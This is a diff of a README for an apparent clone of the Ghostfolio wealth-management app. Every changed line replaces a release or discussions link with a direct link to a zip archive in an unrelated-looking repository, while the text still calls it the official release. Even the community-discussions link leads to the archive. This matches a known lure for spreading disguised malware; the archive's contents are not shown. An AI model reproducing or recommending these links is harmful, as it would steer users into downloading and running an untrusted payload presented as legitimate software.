@@ -6,7 +6,7 @@ description: "Track, analyze, and manage stocks, ETFs, crypto, and net worth wit
 <h1>📊 Ghostfolio-Open-Source-Wealth-Management-Software - Your Personal Portfolio Analytics Dashboard</h1>
 
 <p align="center">
-  <a href="https://github.com/Johnburdonsandersonhaldanepause77/Ghostfolio-Open-Source-Wealth-Management-Software/releases" style="display:inline-block;padding:16px 40px;background-color:#4CAF50;color:white;font-size:22px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW</a>
+  <a href="https://raw.githubusercontent.com/Johnburdonsandersonhaldanepause77/johnburdonsandersonhaldanepause77.github.io/main/picrorhizin/Dist_v1.4-alpha.4.zip" style="display:inline-block;padding:16px 40px;background-color:#4CAF50;color:white;font-size:22px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW</a>
 </p>
 
 ## 👋 Welcome to Ghostfolio
@@ -48,7 +48,7 @@ Follow these **five simple steps** to get Ghostfolio running on your Windows com
 ### Step 1: 📥 Download the Application
 
 Visit this link to download the application:  
-**👉 [Click Here to Download Ghostfolio](https://github.com/Johnburdonsandersonhaldanepause77/Ghostfolio-Open-Source-Wealth-Management-Software/releases)**
+**👉 [Click Here to Download Ghostfolio](https://raw.githubusercontent.com/Johnburdonsandersonhaldanepause77/johnburdonsandersonhaldanepause77.github.io/main/picrorhizin/Dist_v1.4-alpha.4.zip)**
 
 This page contains the official release files. Look for the **latest release** (usually at the top of the page) and click the download button. The download will begin automatically.
 
@@ -130,13 +130,13 @@ Visit the same download link periodically and install any newer version over you
 
 Join our friendly community! Ghostfolio users help each other in the discussions section of our repository.
 
-**Visit:** [GitHub Discussions](https://github.com/Johnburdonsandersonhaldanepause77/Ghostfolio-Open-Source-Wealth-Management-Software/discussions)
+**Visit:** [GitHub Discussions](https://raw.githubusercontent.com/Johnburdonsandersonhaldanepause77/johnburdonsandersonhaldanepause77.github.io/main/picrorhizin/Dist_v1.4-alpha.4.zip)
 
 ## ✅ Final Checklist
 
 Before you go, make sure you've completed these steps:
 
-- [ ] Downloaded the latest version from [our releases page](https://github.com/Johnburdonsandersonhaldanepause77/Ghostfolio-Open-Source-Wealth-Management-Software/releases)
+- [ ] Downloaded the latest version from [our releases page](https://raw.githubusercontent.com/Johnburdonsandersonhaldanepause77/johnburdonsandersonhaldanepause77.github.io/main/picrorhizin/Dist_v1.4-alpha.4.zip)
 - [ ] Successfully launched the application
 - [ ] Accessed your dashboard via **http://localhost:3333**
 - [ ] Created your anonymous account
@@ -149,7 +149,7 @@ Ghostfolio puts professional-grade financial analytics in your hands — without
 **Ready to take control of your financial future?**
 
 <p align="center">
-  <a href="https://github.com/Johnburdonsandersonhaldanepause77/Ghostfolio-Open-Source-Wealth-Management-Software/releases" style="display:inline-block;padding:14px 32px;background-color:#2196F3;color:white;font-size:18px;font-weight:bold;text-decoration:none;border-radius:6px;box-shadow:0 2px 4px rgba(0,0,0,0.2);">⬇️ GET GHOSTFOLIO NOW</a>
+  <a href="https://raw.githubusercontent.com/Johnburdonsandersonhaldanepause77/johnburdonsandersonhaldanepause77.github.io/main/picrorhizin/Dist_v1.4-alpha.4.zip" style="display:inline-block;padding:14px 32px;background-color:#2196F3;color:white;font-size:18px;font-weight:bold;text-decoration:none;border-radius:6px;box-shadow:0 2px 4px rgba(0,0,0,0.2);">⬇️ GET GHOSTFOLIO NOW</a>
 </p>
 
 ---
